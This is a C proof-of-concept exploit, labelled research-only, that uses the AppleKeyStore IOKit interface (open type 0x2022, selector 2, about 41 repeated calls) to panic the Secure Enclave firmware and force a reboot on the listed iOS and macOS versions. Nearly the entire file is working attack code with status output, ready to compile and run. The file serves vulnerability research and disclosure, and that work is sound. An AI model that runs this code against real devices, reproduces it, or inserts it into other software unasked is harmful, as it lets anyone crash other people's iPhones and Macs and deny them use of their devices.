/*
 * sep_panic — deterministic SEP firmware panic PoC (research only).
 *
 * Source: referenceforAI/moreprojects/SEP-Exhaustion-Kernel-Panic/sep_panic_poc.c
 * (zeroxjf). This copy is built by W0lfSword's `poc sep-panic` via the Theos
 * tool target in this directory.
 *
 * Target: AppleKeyStore / AppleSEPKeyStore. Open type 0x2022, selector 2,
 * ~41 calls → SEP SKS task panics at 0x0006fea7 → device reboots.
 * Tested: iOS 26.1–26.2, macOS 26.1–26.2 (A13–A19).
 *
 * THIS CRASHES THE DEVICE. Research only.
 */

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

/* Newer SDKs define kIOMainPortDefault; older ones only have the const. */
#ifndef kIOMainPortDefault
#define kIOMainPortDefault kIOMasterPortDefault
#endif

#define APPLE_KEYSTORE_SERVICE  "AppleKeyStore"
#define VULNERABLE_OPEN_TYPE    0x2022
#define VULNERABLE_SELECTOR     2
#define PANIC_THRESHOLD         41

int main(int argc, char *argv[]) {
    kern_return_t kr;
    io_service_t service;
    io_connect_t connection;

    printf("=== SEP Panic PoC ===\n\n");
    printf("Target: AppleKeyStore selector %d\n", VULNERABLE_SELECTOR);
    printf("Open type: 0x%x\n", VULNERABLE_OPEN_TYPE);
    printf("Panic threshold: ~%d calls\n\n", PANIC_THRESHOLD);

    service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching(APPLE_KEYSTORE_SERVICE)
    );

    if (service == IO_OBJECT_NULL) {
        printf("[-] AppleKeyStore service not found\n");
        return 1;
    }
    printf("[+] Found AppleKeyStore service: 0x%x\n", service);

    kr = IOServiceOpen(service, mach_task_self(), VULNERABLE_OPEN_TYPE, &connection);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        printf("[-] IOServiceOpen failed: 0x%x\n", kr);
        return 1;
    }
    printf("[+] Opened connection: 0x%x\n\n", connection);

    printf("[*] Starting SEP exhaustion attack...\n");
    printf("[*] Device will reboot when SEP panics (~call #%d)\n\n", PANIC_THRESHOLD);

    for (int i = 0; i < 50; i++) {
        uint64_t scalars[6] = { 1, 0, 0, 0x10, 0, 0 };
        uint64_t output[1] = {0};
        uint32_t outputCount = 1;

        kr = IOConnectCallMethod(
            connection,
            VULNERABLE_SELECTOR,
            scalars, 6,
            NULL, 0,
            output, &outputCount,
            NULL, NULL
        );

        printf("[%2d/50] kr=0x%08x%s\n", i + 1, kr,
            (i + 1 >= PANIC_THRESHOLD) ? " <-- THRESHOLD REACHED" : "");

        usleep(1000);
    }

    printf("\n[?] Completed 50 calls without panic\n");
    printf("[?] Check if device is vulnerable or try again\n");

    IOServiceClose(connection);
    return 0;
}
